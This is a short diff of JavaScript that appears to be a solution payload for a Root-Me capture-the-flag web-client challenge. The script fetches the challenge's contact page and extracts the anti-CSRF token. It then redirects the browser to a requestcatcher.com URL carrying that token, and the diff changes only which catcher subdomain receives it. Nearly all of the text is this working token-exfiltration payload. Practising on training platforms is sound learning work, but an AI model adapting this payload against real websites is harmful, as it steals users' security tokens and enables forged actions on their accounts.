@@ -10,7 +10,7 @@ fetch('http://challenge01.root-me.org/web-client/ch23/index.php?action=contact')
 
     const token = doc.querySelector('#token').value
 
-    window.location.href = `https://tyyhty.requestcatcher.com/${token}`
+    window.location.href = `https://yt54h.requestcatcher.com/${token}`
   })
   .catch(error => {
      console.error('Failed to fetch page')
